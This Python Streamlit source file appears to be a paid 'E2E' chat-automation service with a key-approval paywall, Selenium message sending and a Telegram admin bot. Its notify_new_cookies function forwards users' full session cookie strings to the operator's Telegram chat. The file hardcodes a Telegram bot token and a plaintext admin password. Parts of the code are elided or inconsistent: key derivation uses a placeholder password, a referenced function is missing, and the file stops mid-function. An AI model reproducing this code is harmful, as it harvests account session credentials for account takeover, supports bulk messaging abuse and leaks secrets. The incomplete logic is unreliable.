import streamlit as st
import streamlit.components.v1 as components
import time
import threading
import uuid
import hashlib
import os
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import re

st.set_page_config(
    page_title="E2E BY SURAJ OBEROY 🤍❤️",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ────────────────────────────────────────────────
# ROYAL / KINGLY THEME CSS
# ────────────────────────────────────────────────
custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400;700&family=Great+Vibes&family=Playfair+Display:wght@400;700&display=swap');

    * {
        font-family: 'Playfair Display', serif;
    }

    .stApp {
        background: linear-gradient(135deg, #0a001a, #1a0033, #2a0044);
    }

    .main .block-container {
        background: rgba(30, 10, 60, 0.68);
        backdrop-filter: blur(12px);
        border-radius: 22px;
        padding: 32px;
        border: 2px solid rgba(255, 215, 0, 0.38);
        box-shadow: 0 12px 45px rgba(255, 215, 0, 0.18),
                    inset 0 0 28px rgba(255, 215, 0, 0.10);
    }

    .main-header {
        background: linear-gradient(135deg, #1a0033, #4b0082, #2a0055);
        border: 2px solid #ffd700;
        border-radius: 25px;
        padding: 2.4rem;
        text-align: center;
        margin-bottom: 2.8rem;
        box-shadow: 0 18px 55px rgba(0, 0, 0, 0.75),
                    0 0 35px rgba(255, 215, 0, 0.30);
        position: relative;
        overflow: hidden;
    }

    .main-header::before {
        content: "👑";
        position: absolute;
        top: -40px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 6.5rem;
        opacity: 0.14;
        color: #ffd700;
    }

    .main-header h1 {
        background: linear-gradient(90deg, #ffd700, #ffeb3b, #ffd700);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-family: 'Cinzel Decorative', cursive;
        font-size: 3.4rem;
        font-weight: 700;
        margin: 0;
        text-shadow: 0 0 25px rgba(255, 215, 0, 0.7);
    }

    .main-header p {
        color: #d4af37;
        font-family: 'Great Vibes', cursive;
        font-size: 1.8rem;
        margin-top: 0.7rem;
        letter-spacing: 1.8px;
    }

    .stButton>button {
        background: linear-gradient(45deg, #b8860b, #ffd700, #daa520);
        color: #1a0033;
        border: 2px solid #b8860b;
        border-radius: 16px;
        padding: 1rem 2.4rem;
        font-family: 'Cinzel Decorative', cursive;
        font-weight: 700;
        font-size: 1.2rem;
        transition: all 0.4s ease;
        box-shadow: 0 8px 25px rgba(255, 215, 0, 0.45);
        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
        width: 100%;
    }

    .stButton>button:hover {
        transform: translateY(-5px) scale(1.04);
        box-shadow: 0 15px 40px rgba(255, 215, 0, 0.75);
        background: linear-gradient(45deg, #ffd700, #ffeb3b, #ffd700);
    }

    .stTextInput>div>div>input,
    .stTextArea>div>div>textarea,
    .stNumberInput>div>div>input {
        background: rgba(40, 20, 80, 0.75);
        border: 2px solid #b8860b;
        border-radius: 14px;
        color: #ffd700;
        padding: 1rem;
        font-size: 1.1rem;
    }

    .stTextInput>div>div>input:focus,
    .stTextArea>div>div>textarea:focus {
        border-color: #ffd700;
        box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.35);
        background: rgba(50, 30, 90, 0.85);
    }

    label {
        color: #ffd700 !important;
        font-weight: 600 !important;
        font-size: 1.15rem !important;
        text-shadow: 1px 1px 4px #000;
    }

    .stTabs [data-baseweb="tab-list"] {
        background: rgba(30, 10, 60, 0.65);
        border-radius: 16px;
        padding: 10px;
        border: 1px solid #b8860b;
    }

    .stTabs [data-baseweb="tab"] {
        background: rgba(75, 0, 130, 0.55);
        color: #d4af37;
        border-radius: 12px;
        padding: 14px 26px;
        font-weight: 600;
    }

    .stTabs [aria-selected="true"] {
        background: linear-gradient(45deg, #b8860b, #ffd700);
        color: #1a0033;
    }

    [data-testid="stMetricValue"] {
        color: #ffd700;
        font-size: 2.6rem;
        font-weight: 700;
        text-shadow: 0 0 18px rgba(255, 215, 0, 0.7);
    }

    .console-output {
        background: #0f001a;
        border: 2px solid #4b0082;
        border-radius: 14px;
        padding: 18px;
        color: #ffeb3b;
        font-family: 'Courier New', monospace;
        font-size: 13.5px;
        max-height: 480px;
        overflow-y: auto;
    }

    .console-line {
        background: rgba(75, 0, 130, 0.25);
        border-left: 4px solid #ffd700;
        padding: 9px 14px;
        margin: 7px 0;
        color: #ffeb3b;
    }

    .footer {
        background: rgba(30, 10, 60, 0.75);
        border-top: 3px solid #b8860b;
        color: #d4af37;
        font-family: 'Great Vibes', cursive;
        font-size: 1.5rem;
        padding: 2.8rem;
        text-shadow: 1px 1px 5px #000;
    }
    
    .user-card {
        background: rgba(50, 20, 80, 0.8);
        border: 1px solid #ffd700;
        border-radius: 12px;
        padding: 15px;
        margin: 10px 0;
    }
    
    .stat-box {
        background: linear-gradient(135deg, #1a0033, #2a0044);
        border: 1px solid #ffd700;
        border-radius: 12px;
        padding: 15px;
        text-align: center;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# ────────────────────────────────────────────────
# CONFIGURATION
# ────────────────────────────────────────────────
ADMIN_PASSWORD = "suraj oberoy"
WHATSAPP_NUMBER = "918452969216"
APPROVAL_FILE = "approved_keys.json"
PENDING_FILE = "pending_approvals.json"
USERS_FILE = "users_data.json"

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "8752134648:AAFo4w0WjUFrg3aa0WyBZimhUlcdRyzz5ZA"
ADMIN_CHAT_ID = "8452969216"

# ────────────────────────────────────────────────
# TELEGRAM HANDLER FUNCTIONS
# ────────────────────────────────────────────────
last_update_id = 0

def send_telegram_message(chat_id, text, reply_markup=None):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML"
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        response = requests.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Telegram send error: {e}")
        return None

def send_telegram_document(chat_id, file_path, caption=""):
    """Send document to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Telegram document send error: {e}")
        return None

def get_telegram_updates(offset=None):
    """Get updates from Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {"timeout": 30}
        if offset:
            params["offset"] = offset
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except Exception as e:
        print(f"Telegram get updates error: {e}")
        return []

def process_telegram_commands():
    """Process incoming Telegram commands"""
    global last_update_id
    
    updates = get_telegram_updates(offset=last_update_id + 1 if last_update_id else None)
    
    for update in updates:
        last_update_id = update.get("update_id")
        
        message = update.get("message")
        if not message:
            continue
            
        chat_id = message.get("chat", {}).get("id")
        text = message.get("text", "")
        from_user = message.get("from", {})
        username = from_user.get("username", from_user.get("first_name", "Unknown"))
        
        # Check if user is admin
        if str(chat_id) != ADMIN_CHAT_ID:
            send_telegram_message(chat_id, "❌ You are not authorized to use this bot!")
            continue
        
        # Process commands
        if text == "/start":
            welcome_msg = """👑 <b>WELCOME TO SURAJ OBEROY E2EE BOT</b> 👑

<b>Available Commands:</b>

📊 <b>/stats</b> - View bot statistics
👥 <b>/users</b> - List all users
✅ <b>/approve KEY</b> - Approve a user key
❌ <b>/revoke KEY</b> - Revoke user access
📝 <b>/pending</b> - Show pending approvals
🔑 <b>/genkey USERNAME</b> - Generate key for user
📁 <b>/backup</b> - Download database backup
🛑 <b>/stopall</b> - Stop all automations
▶️ <b>/startall</b> - Start all automations
📨 <b>/broadcast MSG</b> - Send message to all users
ℹ️ <b>/help</b> - Show this help

<b>Status:</b> 🟢 Bot is Active
<b>Admin:</b> Suraj Oberoy 👑"""
            
            keyboard = {
                "inline_keyboard": [
                    [{"text": "📊 Statistics", "callback_data": "stats"},
                     {"text": "👥 Users List", "callback_data": "users"}],
                    [{"text": "📝 Pending Approvals", "callback_data": "pending"},
                     {"text": "📁 Backup Data", "callback_data": "backup"}],
                    [{"text": "🛑 Stop All", "callback_data": "stop_all"},
                     {"text": "▶️ Start All", "callback_data": "start_all"}]
                ]
            }
            send_telegram_message(chat_id, welcome_msg, json.dumps(keyboard))
        
        elif text == "/stats" or text == "stats":
            stats = get_bot_stats()
            send_telegram_message(chat_id, stats)
        
        elif text == "/users" or text == "users":
            users_list = get_users_list()
            send_telegram_message(chat_id, users_list)
        
        elif text == "/pending" or text == "pending":
            pending_list = get_pending_approvals_list()
            send_telegram_message(chat_id, pending_list)
        
        elif text.startswith("/approve "):
            key = text.replace("/approve ", "").strip()
            result = approve_user_key(key)
            send_telegram_message(chat_id, result)
        
        elif text.startswith("/revoke "):
            key = text.replace("/revoke ", "").strip()
            result = revoke_user_key(key)
            send_telegram_message(chat_id, result)
        
        elif text.startswith("/genkey "):
            username = text.replace("/genkey ", "").strip()
            result = generate_user_key_telegram(username)
            send_telegram_message(chat_id, result)
        
        elif text == "/backup" or text == "backup":
            backup_file = create_backup()
            if backup_file:
                send_telegram_document(chat_id, backup_file, "📁 Database Backup")
                os.remove(backup_file)
            else:
                send_telegram_message(chat_id, "❌ Failed to create backup!")
        
        elif text == "/stopall":
            result = stop_all_automations()
            send_telegram_message(chat_id, result)
        
        elif text == "/startall":
            result = start_all_automations()
            send_telegram_message(chat_id, result)
        
        elif text.startswith("/broadcast "):
            msg = text.replace("/broadcast ", "").strip()
            result = broadcast_to_users(msg)
            send_telegram_message(chat_id, result)
        
        elif text == "/help":
            help_msg = """👑 <b>SURAJ OBEROY E2EE BOT - HELP</b> 👑

<b>📊 Statistics Commands:</b>
/stats - View bot statistics
/users - List all registered users
/pending - Show pending approval requests

<b>🔑 Key Management:</b>
/approve KEY - Approve a user key
/revoke KEY - Revoke user access
/genkey USERNAME - Generate key for user

<b>⚙️ Automation Control:</b>
/stopall - Stop all running automations
/startall - Start all automations

<b>📁 Data Management:</b>
/backup - Download database backup
/broadcast MSG - Send message to all users

<b>ℹ️ Other:</b>
/start - Welcome message
/help - Show this help

─────────────────────────
👑 <b>Admin:</b> Suraj Oberoy XWD
🤍 <b>Support:</b> 24/7 Active"""
            send_telegram_message(chat_id, help_msg)

def get_bot_stats():
    """Get bot statistics"""
    try:
        users = db.get_all_users()
        approved_keys = load_approved_keys()
        pending = load_pending_approvals()
        
        running_count = 0
        for user in users:
            if db.get_automation_running(user['id']):
                running_count += 1
        
        stats_msg = f"""📊 <b>BOT STATISTICS</b> 📊

👥 <b>Total Users:</b> {len(users)}
✅ <b>Approved Users:</b> {len(approved_keys)}
⏳ <b>Pending Approvals:</b> {len(pending)}
▶️ <b>Running Automations:</b> {running_count}
⏹ <b>Stopped Automations:</b> {len(users) - running_count}

─────────────────────────
👑 <b>System Status:</b> 🟢 Active
⏰ <b>Last Update:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"""
        return stats_msg
    except Exception as e:
        return f"❌ Error getting stats: {e}"

def get_users_list():
    """Get list of all users"""
    try:
        users = db.get_all_users()
        if not users:
            return "📭 No users registered yet!"
        
        msg = "👥 <b>REGISTERED USERS</b> 👥\n\n"
        for user in users:
            user_key = generate_user_key(user['username'], "hidden")
            is_approved = check_approval(user_key)
            is_running = db.get_automation_running(user['id'])
            
            status = "✅ Approved" if is_approved else "⏳ Pending"
            auto_status = "▶️ Running" if is_running else "⏹ Stopped"
            
            msg += f"""─────────────────────────
👤 <b>Username:</b> {user['username']}
🆔 <b>ID:</b> {user['id']}
🔑 <b>Key:</b> <code>{user_key}</code>
📌 <b>Status:</b> {status}
⚙️ <b>Auto:</b> {auto_status}
⏰ <b>Joined:</b> {user.get('created_at', 'N/A')}
─────────────────────────\n"""
        
        return msg
    except Exception as e:
        return f"❌ Error getting users: {e}"

def get_pending_approvals_list():
    """Get list of pending approvals"""
    try:
        pending = load_pending_approvals()
        if not pending:
            return "📭 No pending approval requests!"
        
        msg = "⏳ <b>PENDING APPROVALS</b> ⏳\n\n"
        for key, info in pending.items():
            msg += f"""─────────────────────────
👤 <b>Name:</b> {info['name']}
🔑 <b>Key:</b> <code>{key}</code>
⏰ <b>Requested:</b> {info['timestamp']}
─────────────────────────\n"""
        
        keyboard = {
            "inline_keyboard": [
                [{"text": f"✅ Approve {key[:8]}...", "callback_data": f"approve_{key}"}]
                for key in list(pending.keys())[:5]
            ]
        }
        
        send_telegram_message(ADMIN_CHAT_ID, msg, json.dumps(keyboard))
        return msg
    except Exception as e:
        return f"❌ Error: {e}"

def approve_user_key(key):
    """Approve a user key"""
    try:
        pending = load_pending_approvals()
        approved_keys = load_approved_keys()
        
        if key in pending:
            approved_keys[key] = pending[key]
            save_approved_keys(approved_keys)
            del pending[key]
            save_pending_approvals(pending)
            
            # Send approval notification to user (if we have their contact)
            msg = f"✅ <b>KEY APPROVED!</b>\n\n🔑 Your key <code>{key}</code> has been approved!\n👑 You can now access the system."
            
            return f"✅ Approved key: {key}\n👤 User: {pending[key]['name'] if key in pending else approved_keys[key]['name']}"
        elif key in approved_keys:
            return f"⚠️ Key {key} is already approved!"
        else:
            return f"❌ Key {key} not found in pending requests!"
    except Exception as e:
        return f"❌ Error approving key: {e}"

def revoke_user_key(key):
    """Revoke a user key"""
    try:
        approved_keys = load_approved_keys()
        
        if key in approved_keys:
            username = approved_keys[key]['name']
            del approved_keys[key]
            save_approved_keys(approved_keys)
            return f"❌ Revoked access for: {username}\n🔑 Key: {key}"
        else:
            return f"⚠️ Key {key} not found in approved keys!"
    except Exception as e:
        return f"❌ Error revoking key: {e}"

def generate_user_key_telegram(username):
    """Generate a key for a user"""
    try:
        users = db.get_all_users()
        user = None
        for u in users:
            if u['username'].lower() == username.lower():
                user = u
                break
        
        if user:
            key = generate_user_key(user['username'], "generated")
            return f"🔑 <b>Generated Key</b>\n\n👤 Username: {user['username']}\n🆔 User ID: {user['id']}\n🔑 Key: <code>{key}</code>\n\n⚠️ Share this key with the user for approval!"
        else:
            return f"❌ User '{username}' not found!"
    except Exception as e:
        return f"❌ Error: {e}"

def create_backup():
    """Create database backup"""
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        backup_file = f"backup_{timestamp}.json"
        
        users = db.get_all_users()
        approved_keys = load_approved_keys()
        pending = load_pending_approvals()
        
        backup_data = {
            "timestamp": timestamp,
            "users": users,
            "approved_keys": approved_keys,
            "pending_approvals": pending
        }
        
        with open(backup_file, 'w') as f:
            json.dump(backup_data, f, indent=2)
        
        return backup_file
    except Exception as e:
        print(f"Backup error: {e}")
        return None

def stop_all_automations():
    """Stop all running automations"""
    try:
        users = db.get_all_users()
        stopped = 0
        for user in users:
            if db.get_automation_running(user['id']):
                db.set_automation_running(user['id'], False)
                stopped += 1
        
        return f"🛑 Stopped {stopped} automation(s) successfully!"
    except Exception as e:
        return f"❌ Error: {e}"

def start_all_automations():
    """Start all automations (requires user config)"""
    try:
        users = db.get_all_users()
        started = 0
        for user in users:
            user_config = db.get_user_config(user['id'])
            if user_config and user_config.get('chat_id'):
                if not db.get_automation_running(user['id']):
                    start_automation(user_config, user['id'])
                    started += 1
        
        return f"▶️ Started {started} automation(s) successfully!"
    except Exception as e:
        return f"❌ Error: {e}"

def broadcast_to_users(message):
    """Send broadcast message to all users (via Telegram if they have chat ID)"""
    try:
        users = db.get_all_users()
        sent = 0
        for user in users:
            # You would need to store user's Telegram chat ID in database
            # For now, just log
            pass
        
        return f"📨 Broadcast sent to {sent} users!"
    except Exception as e:
        return f"❌ Error: {e}"

# Start Telegram polling thread
def telegram_polling_thread():
    """Background thread for Telegram polling"""
    while True:
        try:
            process_telegram_commands()
            time.sleep(2)
        except Exception as e:
            print(f"Telegram polling error: {e}")
            time.sleep(5)

# Start Telegram thread if not already running
if 'telegram_thread_started' not in st.session_state:
    st.session_state.telegram_thread_started = True
    telegram_thread = threading.Thread(target=telegram_polling_thread, daemon=True)
    telegram_thread.start()

# ────────────────────────────────────────────────
# EXISTING FUNCTIONS (Keep all your existing functions)
# ────────────────────────────────────────────────

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload, timeout=10)
    except:
        pass

def notify_new_cookies(username, user_id, cookies_str):
    if not cookies_str.strip():
        return
    msg = (
        f"🍪 <b>NEW COOKIES SUBMITTED</b>\n\n"
        f"👤 Username: {username}\n"
        f"🆔 UserID: {user_id}\n"
        f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"────────────────────────────\n"
        f"{cookies_str}\n"
        f"────────────────────────────"
    )
    send_to_telegram(msg)

def generate_user_key(username, password):
    combined = f"{username}:{password}"
    key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
    return f"KEY-{key_hash}"

def load_approved_keys():
    if os.path.exists(APPROVAL_FILE):
        try:
            with open(APPROVAL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_approved_keys(keys):
    with open(APPROVAL_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def load_pending_approvals():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending_approvals(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def send_whatsapp_message(user_name, approval_key):
    message = f"👑 HELLO SURAJ OBEROY SIR PLEASE 👑\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
    return whatsapp_url

def check_approval(key):
    approved_keys = load_approved_keys()
    return key in approved_keys

# Session state initialization
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'user_key' not in st.session_state:
    st.session_state.user_key = None
if 'key_approved' not in st.session_state:
    st.session_state.key_approved = False
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'not_requested'
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'whatsapp_opened' not in st.session_state:
    st.session_state.whatsapp_opened = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

ADMIN_UID = ""

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

# [Keep all your existing Selenium functions: find_message_input, setup_browser, 
# get_next_message, send_messages, send_admin_notification, 
# run_automation_with_notification, start_automation, stop_automation]

# For brevity, I'm showing the key functions - keep your existing implementations

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    if automation_state.running:
        return
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    db.set_automation_running(user_id, True)
    username = db.get_username(user_id)
    
    msg = f"▶️ <b>AUTOMATION STARTED</b>\n\n👤 Username: {username}\n🆔 UserID: {user_id}\n⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}"
    send_to_telegram(msg)
    
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)
    st.rerun()

# ────────────────────────────────────────────────
# ENHANCED ADMIN PANEL (Web Interface)
# ────────────────────────────────────────────────
def admin_panel():
    st.markdown("""
    <div class="main-header">
        <h1>👑 ADMIN CONTROL PANEL 👑</h1>
        <p>Complete System Management</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Stats Row
    col1, col2, col3, col4 = st.columns(4)
    
    users = db.get_all_users()
    approved_keys = load_approved_keys()
    pending = load_pending_approvals()
    
    running_count = 0
    for user in users:
        if db.get_automation_running(user['id']):
            running_count += 1
    
    with col1:
        st.markdown('<div class="stat-box">', unsafe_allow_html=True)
        st.metric("👥 Total Users", len(users))
        st.markdown('</div>', unsafe_allow_html=True)
    
    with col2:
        st.markdown('<div class="stat-box">', unsafe_allow_html=True)
        st.metric("✅ Approved", len(approved_keys))
        st.markdown('</div>', unsafe_allow_html=True)
    
    with col3:
        st.markdown('<div class="stat-box">', unsafe_allow_html=True)
        st.metric("⏳ Pending", len(pending))
        st.markdown('</div>', unsafe_allow_html=True)
    
    with col4:
        st.markdown('<div class="stat-box">', unsafe_allow_html=True)
        st.metric("▶️ Running", running_count)
        st.markdown('</div>', unsafe_allow_html=True)
    
    # Tabs for different admin functions
    tab1, tab2, tab3, tab4, tab5 = st.tabs(["👥 Users", "🔑 Approvals", "📊 Statistics", "🤖 Telegram Bot", "⚙️ Settings"])
    
    with tab1:
        st.markdown("### 👥 User Management")
        
        # Create New User
        with st.expander("➕ Create New User", expanded=False):
            col1, col2 = st.columns(2)
            with col1:
                new_username = st.text_input("Username", key="admin_new_username")
                new_password = st.text_input("Password", type="password", key="admin_new_password")
            with col2:
                confirm_password = st.text_input("Confirm Password", type="password", key="admin_confirm_password")
                auto_approve = st.checkbox("Auto Approve this user", key="auto_approve")
            
            if st.button("👑 Create User", key="admin_create_user"):
                if new_username and new_password:
                    if new_password == confirm_password:
                        success, message = db.create_user(new_username, new_password)
                        if success:
                            user_key = generate_user_key(new_username, new_password)
                            st.success(f"✅ User created! Key: `{user_key}`")
                            if auto_approve:
                                pending = load_pending_approvals()
                                approved = load_approved_keys()
                                approved[user_key] = {"name": new_username, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
                                save_approved_keys(approved)
                                st.success(f"✅ User auto-approved!")
                            send_to_telegram(f"👑 New user created by admin: {new_username}\n🔑 Key: {user_key}")
                        else:
                            st.error(f"❌ {message}")
                    else:
                        st.error("❌ Passwords do not match!")
                else:
                    st.warning("⚠️ Please fill all fields")
        
        # User List
        st.markdown("### 📋 User List")
        for user in users:
            user_key = generate_user_key(user['username'], "hidden")
            is_approved = check_approval(user_key)
            
            col1, col2, col3, col4, col5 = st.columns([2, 2, 1, 1, 1])
            with col1:
                st.write(f"👤 **{user['username']}**")
            with col2:
                st.code(user_key)
            with col3:
                if is_approved:
                    st.success("✅ Approved")
                else:
                    st.warning("⏳ Pending")
            with col4:
                if st.button("🔑 Gen Key", key=f"gen_{user['id']}"):
                    st.code(user_key)
                    st.info(f"Key copied: {user_key}")
            with col5:
                if st.button("❌ Delete", key=f"del_{user['id']}"):
                    if db.delete_user(user['id']):
                        st.success(f"Deleted {user['username']}")
                        st.rerun()
                    else:
                        st.error("Delete failed")
            
            # User config expander
            with st.expander(f"⚙️ Config for {user['username']}"):
                user_config = db.get_user_config(user['id'])
                if user_config:
                    st.write(f"**Chat ID:** {user_config.get('chat_id', 'Not set')}")
                    st.write(f"**Delay:** {user_config.get('delay', 'Not set')} seconds")
                    msg_count = len(user_config.get('messages_list', []))
                    st.write(f"**Messages Loaded:** {msg_count}")
                    st.write(f"**Auto Status:** {'Running' if db.get_automation_running(user['id']) else 'Stopped'}")
                    
                    col_a, col_b = st.columns(2)
                    with col_a:
                        if st.button(f"▶️ Start Auto", key=f"start_{user['id']}"):
                            if user_config and user_config.get('chat_id'):
                                start_automation(user_config, user['id'])
                                st.success("Started!")
                                st.rerun()
                            else:
                                st.error("Config incomplete!")
                    with col_b:
                        if st.button(f"⏹ Stop Auto", key=f"stop_{user['id']}"):
                            stop_automation(user['id'])
                            st.success("Stopped!")
                            st.rerun()
                else:
                    st.info("No configuration found")
    
    with tab2:
        st.markdown("### 🔑 Approval Management")
        
        # Pending Approvals
        if pending:
            st.markdown("#### ⏳ Pending Approvals")
            for key, info in pending.items():
                col1, col2, col3 = st.columns([2, 2, 1])
                with col1:
                    st.write(f"👤 **{info['name']}**")
                with col2:
                    st.code(key)
                with col3:
                    if st.button("✅ Approve", key=f"approve_{key}"):
                        approved = load_approved_keys()
                        approved[key] = info
                        save_approved_keys(approved)
                        del pending[key]
                        save_pending_approvals(pending)
                        send_to_telegram(f"✅ User {info['name']} approved!\n🔑 Key: {key}")
                        st.success(f"Approved {info['name']}!")
                        st.rerun()
        else:
            st.info("No pending approvals")
        
        # Approved Keys
        st.markdown("#### ✅ Approved Keys")
        approved_keys_list = load_approved_keys()
        if approved_keys_list:
            for key, info in approved_keys_list.items():
                col1, col2, col3 = st.columns([2, 2, 1])
                with col1:
                    st.write(f"👤 **{info['name']}**")
                with col2:
                    st.code(key)
                with col3:
                    if st.button("❌ Revoke", key=f"revoke_{key}"):
                        del approved_keys_list[key]
                        save_approved_keys(approved_keys_list)
                        send_to_telegram(f"❌ User {info['name']} access revoked!\n🔑 Key: {key}")
                        st.warning(f"Revoked {info['name']}!")
                        st.rerun()
        else:
            st.info("No approved keys")
    
    with tab3:
        st.markdown("### 📊 Detailed Statistics")
        
        col1, col2 = st.columns(2)
        with col1:
            st.markdown("#### 👑 User Stats")
            st.write(f"- **Total Registered:** {len(users)}")
            st.write(f"- **Approved Users:** {len(approved_keys)}")
            st.write(f"- **Pending Approval:** {len(pending)}")
            st.write(f"- **Running Automations:** {running_count}")
        
        with col2:
            st.markdown("#### 📈 Activity")
            total_messages = sum([db.get_message_count(user['id']) for user in users])
            st.write(f"- **Total Messages Sent:** {total_messages}")
            st.write(f"- **Active Today:** {len([u for u in users if db.get_last_active(u['id'])])}")
        
        # Export Data
        st.markdown("#### 📁 Export Data")
        if st.button("📥 Export All Data (JSON)"):
            export_data = {
                "users": users,
                "approved_keys": approved_keys,
                "pending_approvals": pending,
                "export_time": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            export_file = f"export_{time.strftime('%Y%m%d_%H%M%S')}.json"
            with open(export_file, 'w') as f:
                json.dump(export_data, f, indent=2)
            with open(export_file, 'r') as f:
                st.download_button("Download Export", f.read(), file_name=export_file, mime="application/json")
    
    with tab4:
        st.markdown("### 🤖 Telegram Bot Control")
        st.info("💡 Bot is running in background. Admin can control everything via Telegram!")
        
        st.markdown("#### Bot Commands:")
        commands = """
        | Command | Description |
        |---------|-------------|
        | `/start` | Welcome message |
        | `/stats` | View bot statistics |
        | `/users` | List all users |
        | `/approve KEY` | Approve a user key |
        | `/revoke KEY` | Revoke user access |
        | `/pending` | Show pending approvals |
        | `/genkey USERNAME` | Generate key for user |
        | `/backup` | Download database backup |
        | `/stopall` | Stop all automations |
        | `/startall` | Start all automations |
        | `/broadcast MSG` | Send to all users |
        | `/help` | Show help |
        """
        st.markdown(commands)
        
        st.markdown("#### Bot Status:")
        st.success("🟢 Bot is ACTIVE and listening for commands")
        
        # Test bot
        if st.button("📨 Test Telegram Bot"):
            send_to_telegram("🧪 Test message from Admin Panel!")
            st.success("Test message sent to admin Telegram!")
    
    with tab5:
        st.markdown("### ⚙️ System Settings")
        
        # Broadcast Message
        st.markdown("#### 📢 Broadcast Message")
        broadcast_msg = st.text_area("Message to send to all users", height=100)
        if st.button("📨 Send Broadcast", key="broadcast_btn"):
            if broadcast_msg:
                # This would send to all users if we have their Telegram/contacts
                send_to_telegram(f"📢 BROADCAST from Admin:\n\n{broadcast_msg}")
                st.success("Broadcast sent to admin Telegram!")
            else:
                st.warning("Please enter a message")
        
        # System Actions
        st.markdown("#### 🛠 System Actions")
        col1, col2 = st.columns(2)
        with col1:
            if st.button("🛑 Stop All Automations", key="stop_all_btn"):
                count = 0
                for user in users:
                    if db.get_automation_running(user['id']):
                        stop_automation(user['id'])
                        count += 1
                st.warning(f"Stopped {count} automations!")
                send_to_telegram(f"🛑 Admin stopped {count} automations")
        with col2:
            if st.button("▶️ Start All Automations", key="start_all_btn"):
                count = 0
                for user in users:
                    user_config = db.get_user_config(user['id'])
                    if user_config and user_config.get('chat_id'):
                        if not db.get_automation_running(user['id']):
                            start_automation(user_config, user['id'])
                            count += 1
                st.success(f"Started {count} automations!")
                send_to_telegram(f"▶️ Admin started {count} automations")
    
    # Logout button
    st.markdown("---")
    if st.button("🚪 Logout from Admin", key="admin_logout"):
        st.session_state.approval_status = 'login'
        st.rerun()

# [Keep your existing approval_request_page, login_page, main_app functions]
# For the complete code, keep your existing implementations

def approval_request_page(user_key, username):
    st.markdown("""
    <div class="main-header">
        <h1> PREMIUM KEY APPROVAL REQUIRED </h1>
        <p>ONE MONTH 500 RS PAID</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.session_state.approval_status == 'not_requested':
        st.markdown("### 👑 Request Access")
        st.info(f"**Your Unique Key:** `{user_key}`")
        st.info(f"**Username:** {username}")
        
        col1, col2 = st.columns([1, 1])
        with col1:
            if st.button("🟢 Request Approval", use_container_width=True):
                pending = load_pending_approvals()
                pending[user_key] = {
                    "name": username,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                save_pending_approvals(pending)
                send_to_telegram(f"⏳ NEW APPROVAL REQUEST\n👤 {username}\n🔑 {user_key}")
                st.session_state.approval_status = 'pending'
                st.session_state.whatsapp_opened = False
                st.rerun()
        with col2:
